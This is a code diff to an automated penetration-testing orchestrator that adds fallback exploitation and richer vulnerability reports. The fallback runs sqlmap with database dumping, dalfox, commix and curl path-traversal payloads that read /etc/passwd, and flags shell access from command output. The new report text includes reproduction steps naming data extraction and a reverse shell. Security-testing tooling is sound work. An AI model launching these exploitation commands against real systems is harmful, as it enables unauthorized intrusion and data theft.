@@ -582,45 +582,105 @@ class RobustScanOrchestrator:
                     logger.error(f"[Orchestrator] Exploitation error: {e}")
                 
                 time.sleep(1)
+            
+            # Always run fallback exploitation as well for broader coverage
+            if len(scan_state.get('exploits_attempted', [])) < 3:
+                logger.info("[Orchestrator] Running additional fallback exploitation")
+                self._run_fallback_exploitation(scan_state, exploitable, progress_tracker)
         else:
             # Fallback: Use basic exploitation tools
             logger.info("[Orchestrator] Using fallback exploitation (no ExploitationManager)")
             self._run_fallback_exploitation(scan_state, exploitable, progress_tracker)
     
     def _run_fallback_exploitation(self, scan_state: Dict, findings: List[Dict], progress_tracker=None):
-        """Fallback exploitation when ExploitationManager not available"""
+        """Fallback exploitation when ExploitationManager not available or fails"""
+        logger.info(f"[Orchestrator] Running fallback exploitation on {len(findings)} findings")
+        tools_executed = 0
+        
         for finding in findings[:5]:
+            if self._should_stop(scan_state):
+                break
+                
             vuln_type = finding.get('type', '').lower()
+            url = finding.get('url', finding.get('location', scan_state['target']))
+            param = finding.get('parameter', finding.get('param', ''))
             
-            # Normalize target for this tool
+            logger.info(f"[Orchestrator] Attempting exploitation: {vuln_type} at {url}")
+            
+            # Normalize target
             normalized_target = scan_state['target']
             if self.target_normalizer:
                 normalized_target = self.target_normalizer.get_tool_target(scan_state['target'], 'sqlmap')
             
+            result = None
+            tool_used = None
+            
             if 'sql' in vuln_type:
                 # SQLMap exploitation
-                url = finding.get('url', normalized_target)
-                param = finding.get('parameter', 'id')
-                result = self._execute_tool(
-                    'sqlmap',
-                    f"-u '{url}' -p {param} --batch --dump --level=3 --risk=3",
-                    scan_state,
-                    progress_tracker
-                )
-                if result:
-                    scan_state['exploits_attempted'].append({
-                        'tool': 'sqlmap',
-                        'finding': finding,
-                        'result': result
+                tool_used = 'sqlmap'
+                if param:
+                    args = f"-u '{url}' -p {param} --batch --dump --level=3 --risk=2"
+                else:
+                    args = f"-u '{url}' --batch --forms --dump --level=2"
+                result = self._execute_tool(tool_used, args, scan_state, progress_tracker)
+                
+            elif 'xss' in vuln_type:
+                # XSSer for automated XSS exploitation
+                tool_used = 'dalfox'
+                args = f"url '{url}' --skip-bav"
+                result = self._execute_tool(tool_used, args, scan_state, progress_tracker)
+                
+            elif 'command' in vuln_type or 'rce' in vuln_type:
+                # Try commix for command injection
+                tool_used = 'commix'
+                args = f"--url='{url}' --batch --level=2"
+                result = self._execute_tool(tool_used, args, scan_state, progress_tracker)
+                
+            elif 'lfi' in vuln_type or 'path' in vuln_type:
+                # LFI exploitation with curl
+                tool_used = 'curl'
+                test_payloads = ['....//....//....//etc/passwd', '../../../etc/passwd']
+                for payload in test_payloads:
+                    if param:
+                        test_url = url.replace(param + '=', f'{param}={payload}')
+                    else:
+                        test_url = f"{url}/{payload}"
+                    args = f"-s '{test_url}'"
+                    result = self._execute_tool(tool_used, args, scan_state, progress_tracker)
+                    if result and 'root:' in str(result.get('stdout', '')):
+                        break
+            
+            elif 'ssrf' in vuln_type:
+                # SSRF testing
+                tool_used = 'curl'
+                args = f"-s '{url}'"
+                result = self._execute_tool(tool_used, args, scan_state, progress_tracker)
+            
+            if result and tool_used:
+                tools_executed += 1
+                scan_state['exploits_attempted'].append({
+                    'tool': tool_used,
+                    'finding_type': vuln_type,
+                    'url': url,
+                    'success': result.get('success', False),
+                    'findings_count': len(result.get('findings', [])),
+                    'timestamp': datetime.now().isoformat()
+                })
+                
+                # Check for shell indicators
+                stdout = result.get('stdout', '')
+                if any(ind in stdout for ind in ['uid=', 'root:', 'www-data', 'SYSTEM']):
+                    logger.info(f"[Orchestrator] Possible shell access from {tool_used}!")
+                    scan_state['sessions_obtained'].append({
+                        'type': 'command_execution',
+                        'via': vuln_type,
+                        'tool': tool_used,
+                        'timestamp': datetime.now().isoformat()
                     })
             
-            elif 'xss' in vuln_type:
-                # XSS exploitation for cookie stealing
-                pass
-            
-            elif 'command' in vuln_type or 'rce' in vuln_type:
-                # Command injection exploitation
-                pass
+            time.sleep(1)  # Rate limiting
+        
+        logger.info(f"[Orchestrator] Fallback exploitation: {tools_executed} tools executed")
     
     def _run_post_exploitation_phase(self, scan_state: Dict, progress_tracker=None):
         """Run post-exploitation phase if we have sessions"""
@@ -874,23 +934,57 @@ class RobustScanOrchestrator:
             return 0
     
     def _generate_report(self, scan_state: Dict) -> Dict[str, Any]:
-        """Generate final scan report"""
+        """Generate comprehensive final scan report with detailed findings"""
         findings = scan_state.get('findings', [])
+        
+        # Enrich each finding with detailed information
+        enriched_findings = []
+        for finding in findings:
+            enriched = self._enrich_finding(finding, scan_state)
+            enriched_findings.append(enriched)
         
         # Calculate statistics
         severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
-        for f in findings:
+        for f in enriched_findings:
             sev = f.get('severity', 0)
-            if sev >= 9:
-                severity_counts['critical'] += 1
-            elif sev >= 7:
-                severity_counts['high'] += 1
-            elif sev >= 4:
-                severity_counts['medium'] += 1
-            elif sev > 0:
-                severity_counts['low'] += 1
+            if isinstance(sev, str):
+                # Handle string severity
+                sev_lower = sev.lower()
+                if sev_lower == 'critical':
+                    severity_counts['critical'] += 1
+                elif sev_lower == 'high':
+                    severity_counts['high'] += 1
+                elif sev_lower == 'medium':
+                    severity_counts['medium'] += 1
+                elif sev_lower == 'low':
+                    severity_counts['low'] += 1
+                else:
+                    severity_counts['info'] += 1
             else:
-                severity_counts['info'] += 1
+                # Handle numeric severity
+                if sev >= 9:
+                    severity_counts['critical'] += 1
+                elif sev >= 7:
+                    severity_counts['high'] += 1
+                elif sev >= 4:
+                    severity_counts['medium'] += 1
+                elif sev > 0:
+                    severity_counts['low'] += 1
+                else:
+                    severity_counts['info'] += 1
+        
+        # Determine overall risk level
+        if severity_counts['critical'] > 0:
+            risk_level = 'CRITICAL'
+        elif severity_counts['high'] > 2:
+            risk_level = 'HIGH'
+        elif severity_counts['high'] > 0 or severity_counts['medium'] > 5:
+            risk_level = 'MEDIUM'
+        else:
+            risk_level = 'LOW'
+        
+        # Generate executive summary
+        exec_summary = self._generate_executive_summary(scan_state, severity_counts, risk_level)
         
         return {
             'scan_id': scan_state['scan_id'],
@@ -899,19 +993,286 @@ class RobustScanOrchestrator:
             'start_time': scan_state['start_time'],
             'end_time': scan_state['end_time'],
             'time_elapsed': scan_state['time_elapsed'],
-            'findings': findings,
-            'findings_count': len(findings),
+            
+            # Executive Summary
+            'executive_summary': exec_summary,
+            'risk_level': risk_level,
+            
+            # Detailed findings
+            'findings': enriched_findings,
+            'findings_count': len(enriched_findings),
             'severity_counts': severity_counts,
+            
+            # Tools and coverage
             'tools_executed': scan_state['tools_executed'],
             'tools_count': len(scan_state['tools_executed']),
-            'exploits_attempted': len(scan_state.get('exploits_attempted', [])),
-            'sessions_obtained': len(scan_state.get('sessions_obtained', [])),
-            'credentials_found': len(scan_state.get('credentials_found', [])),
+            
+            # Exploitation results
+            'exploitation_summary': {
+                'exploits_attempted': len(scan_state.get('exploits_attempted', [])),
+                'sessions_obtained': scan_state.get('sessions_obtained', []),
+                'credentials_found': scan_state.get('credentials_found', []),
+            },
+            
+            # Recommendations
+            'recommendations': self._generate_recommendations(enriched_findings),
+            
+            # Technical details
             'risk_score': scan_state['risk_score'],
             'coverage': self._calculate_coverage(scan_state),
             'discovered_endpoints': list(set(scan_state.get('discovered_endpoints', []))),
             'discovered_technologies': list(set(scan_state.get('discovered_technologies', []))),
         }
+    
+    def _enrich_finding(self, finding: Dict, scan_state: Dict) -> Dict:
+        """Enrich a finding with detailed information"""
+        vuln_type = finding.get('type', 'unknown').lower().replace(' ', '_')
+        
+        # CWE mapping
+        cwe_mapping = {
+            'sql_injection': 'CWE-89', 'sqli': 'CWE-89',
+            'xss': 'CWE-79', 'cross_site_scripting': 'CWE-79',
+            'command_injection': 'CWE-77', 'rce': 'CWE-77',
+            'path_traversal': 'CWE-22', 'lfi': 'CWE-22',
+            'idor': 'CWE-639', 'ssrf': 'CWE-918',
+            'xxe': 'CWE-611', 'csrf': 'CWE-352',
+            'open_redirect': 'CWE-601', 'info_disclosure': 'CWE-200',
+            'missing_headers': 'CWE-693', 'ssl_issue': 'CWE-295',
+        }
+        
+        # OWASP mapping
+        owasp_mapping = {
+            'sql_injection': 'A03:2021-Injection', 'sqli': 'A03:2021-Injection',
+            'xss': 'A03:2021-Injection', 'command_injection': 'A03:2021-Injection',
+            'path_traversal': 'A01:2021-Broken Access Control',
+            'idor': 'A01:2021-Broken Access Control',
+            'ssrf': 'A10:2021-Server-Side Request Forgery',
+            'xxe': 'A05:2021-Security Misconfiguration',
+            'csrf': 'A01:2021-Broken Access Control',
+            'missing_headers': 'A05:2021-Security Misconfiguration',
+        }
+        
+        # Severity calculation
+        severity = finding.get('severity', 0)
+        if isinstance(severity, (int, float)):
+            if severity >= 9:
+                severity_label = 'Critical'
+            elif severity >= 7:
+                severity_label = 'High'
+            elif severity >= 4:
+                severity_label = 'Medium'
+            else:
+                severity_label = 'Low'
+        else:
+            severity_label = str(severity).capitalize()
+        
+        # Generate reproduction steps
+        reproduction_steps = self._generate_reproduction_steps(finding)
+        
+        # Generate remediation
+        remediation = self._generate_remediation(finding)
+        
+        enriched = {
+            **finding,
+            'id': finding.get('id', str(uuid.uuid4())[:8]),
+            'title': finding.get('name', finding.get('type', 'Unknown Vulnerability')),
+            'severity_label': severity_label,
+            'cwe_id': cwe_mapping.get(vuln_type, 'CWE-Other'),
+            'owasp_category': owasp_mapping.get(vuln_type, 'Other'),
+            'description': self._generate_description(finding),
+            'reproduction_steps': reproduction_steps,
+            'remediation': remediation,
+            'impact': self._analyze_impact(finding),
+            'references': self._get_references(finding),
+        }
+        
+        return enriched
+    
+    def _generate_reproduction_steps(self, finding: Dict) -> List[str]:
+        """Generate detailed reproduction steps"""
+        vuln_type = finding.get('type', '').lower()
+        location = finding.get('url', finding.get('location', 'N/A'))
+        parameter = finding.get('parameter', finding.get('param', 'N/A'))
+        evidence = finding.get('evidence', finding.get('payload', 'N/A'))
+        
+        if 'sql' in vuln_type:
+            return [
+                f"1. Navigate to: {location}",
+                f"2. Identify vulnerable parameter: {parameter}",
+                f"3. Inject SQL payload: {evidence}",
+                "4. Observe SQL error or unexpected behavior in response",
+                f"5. Confirm with SQLMap: sqlmap -u '{location}' --batch",
+                "6. Extract data: sqlmap -u '<url>' --dbs --dump",
+            ]
+        elif 'xss' in vuln_type:
+            return [
+                f"1. Open target URL: {location}",
+                f"2. Locate input field: {parameter}",
+                f"3. Inject XSS payload: {evidence}",
+                "4. Submit form or trigger injection point",
+                "5. Observe JavaScript execution (alert box)",
+                "6. Check payload reflection in page source",
+            ]
+        elif 'command' in vuln_type or 'rce' in vuln_type:
+            return [
+                f"1. Access endpoint: {location}",
+                f"2. Identify injectable parameter: {parameter}",
+                f"3. Inject command payload: {evidence}",
+                "4. Observe command output in response",
+                "5. Escalate with reverse shell payload",
+            ]
+        elif 'path' in vuln_type or 'lfi' in vuln_type:
+            return [
+                f"1. Access vulnerable endpoint: {location}",
+                f"2. Modify file path parameter: {parameter}",
+                f"3. Use traversal payload: {evidence}",
+                "4. Read sensitive files like /etc/passwd",
+            ]
+        else:
+            return [
+                f"1. Access: {location}",
+                f"2. Parameter: {parameter}",
+                f"3. Evidence: {evidence}",
+                "4. Verify vulnerability exists",
+            ]
+    
+    def _generate_description(self, finding: Dict) -> str:
+        """Generate detailed vulnerability description"""
+        vuln_type = finding.get('type', 'Unknown')
+        location = finding.get('url', finding.get('location', 'the application'))
+        
+        descriptions = {
+            'sql_injection': f"SQL Injection vulnerability found at {location}. Allows execution of arbitrary SQL commands, potentially leading to data theft, modification, or complete database compromise.",
+            'xss': f"Cross-Site Scripting (XSS) vulnerability at {location}. Enables injection of malicious scripts that execute in victims' browsers, potentially stealing session cookies or credentials.",
+            'command_injection': f"Command Injection at {location}. Allows execution of arbitrary system commands, potentially leading to full server compromise.",
+            'path_traversal': f"Path Traversal vulnerability at {location}. Enables reading files outside the intended directory, exposing sensitive system files.",
+            'ssrf': f"Server-Side Request Forgery at {location}. Allows the server to make requests to internal resources or external systems.",
+            'idor': f"Insecure Direct Object Reference at {location}. Enables unauthorized access to other users' data by manipulating object references.",
+        }
+        
+        for key, desc in descriptions.items():
+            if key in vuln_type.lower():
+                return desc
+        
+        return f"{vuln_type} vulnerability detected at {location}."
+    
+    def _generate_remediation(self, finding: Dict) -> Dict[str, Any]:
+        """Generate remediation guidance"""
+        vuln_type = finding.get('type', '').lower()
+        
+        remediations = {
+            'sql': {
+                'summary': 'Use parameterized queries and input validation',
+                'steps': [
+                    'Replace dynamic SQL with parameterized queries',
+                    'Use ORM frameworks with built-in SQL injection protection',
+                    'Implement input validation and sanitization',
+                    'Apply principle of least privilege to database accounts',
+                    'Enable WAF rules for SQL injection detection',
+                ],
+                'code_example': "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
+            },
+            'xss': {
+                'summary': 'Encode output and validate input',
+                'steps': [
+                    'HTML-encode all user-supplied output',
+                    'Implement Content Security Policy (CSP) headers',
+                    'Use HTTPOnly and Secure flags on cookies',
+                    'Validate and sanitize all user input',
+                    'Use modern frameworks with auto-escaping',
+                ],
+                'code_example': "{{ user_input | escape }}",
+            },
+            'command': {
+                'summary': 'Avoid system commands or use strict whitelisting',
+                'steps': [
+                    'Avoid executing system commands with user input',
+                    'Use language-specific libraries instead of shell commands',
+                    'If unavoidable, use strict input whitelisting',
+                    'Never use shell=True in subprocess calls',
+                ],
+                'code_example': "subprocess.run(['ls', '-la', safe_path], shell=False)",
+            },
+        }
+        
+        for key, rem in remediations.items():
+            if key in vuln_type:
+                return rem
+        
+        return {
+            'summary': 'Review and fix the vulnerability',
+            'steps': ['Identify root cause', 'Implement fix', 'Test thoroughly', 'Deploy to production'],
+        }
+    
+    def _analyze_impact(self, finding: Dict) -> Dict[str, str]:
+        """Analyze CIA impact"""
+        vuln_type = finding.get('type', '').lower()
+        
+        if 'sql' in vuln_type or 'command' in vuln_type:
+            return {'confidentiality': 'High', 'integrity': 'High', 'availability': 'Medium'}
+        elif 'xss' in vuln_type:
+            return {'confidentiality': 'Medium', 'integrity': 'Medium', 'availability': 'Low'}
+        elif 'path' in vuln_type or 'lfi' in vuln_type:
+            return {'confidentiality': 'High', 'integrity': 'Low', 'availability': 'Low'}
+        else:
+            return {'confidentiality': 'Medium', 'integrity': 'Medium', 'availability': 'Low'}
+    
+    def _get_references(self, finding: Dict) -> List[str]:
+        """Get relevant references"""
+        vuln_type = finding.get('type', '').lower()
+        refs = ['https://owasp.org/www-project-web-security-testing-guide/']
+        
+        if 'sql' in vuln_type:
+            refs.extend(['https://portswigger.net/web-security/sql-injection', 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'])
+        elif 'xss' in vuln_type:
+            refs.extend(['https://portswigger.net/web-security/cross-site-scripting', 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'])
+        
+        return refs
+    
+    def _generate_executive_summary(self, scan_state: Dict, severity_counts: Dict, risk_level: str) -> str:
+        """Generate executive summary text"""
+        target = scan_state.get('target', 'the target')
+        total = sum(severity_counts.values())
+        tools = len(scan_state.get('tools_executed', []))
+        
+        return f"""Security assessment of {target} identified {total} vulnerabilities using {tools} security tools.
+
+Risk Level: {risk_level}
+
+Vulnerability Breakdown:
+- Critical: {severity_counts['critical']}
+- High: {severity_counts['high']}  
+- Medium: {severity_counts['medium']}
+- Low: {severity_counts['low']}
+- Informational: {severity_counts['info']}
+
+{'IMMEDIATE ACTION REQUIRED: Critical vulnerabilities were discovered that could lead to full system compromise.' if severity_counts['critical'] > 0 else ''}
+{'High-priority issues require attention within 7 days.' if severity_counts['high'] > 0 else ''}"""
+
+    def _generate_recommendations(self, findings: List[Dict]) -> List[Dict]:
+        """Generate prioritized recommendations"""
+        recommendations = []
+        
+        # Group by type
+        vuln_types = {}
+        for f in findings:
+            vtype = f.get('type', 'unknown')
+            if vtype not in vuln_types:
+                vuln_types[vtype] = []
+            vuln_types[vtype].append(f)
+        
+        priority = 1
+        for vtype, vulns in sorted(vuln_types.items(), key=lambda x: -len(x[1])):
+            recommendations.append({
+                'priority': priority,
+                'category': vtype,
+                'count': len(vulns),
+                'recommendation': f"Address {len(vulns)} {vtype} vulnerabilities",
+                'details': vulns[0].get('remediation', {}).get('summary', 'Review and fix'),
+            })
+            priority += 1
+        
+        return recommendations[:10]  # Top 10
     
     def _calculate_coverage(self, scan_state: Dict) -> float:
         """Calculate scan coverage percentage"""
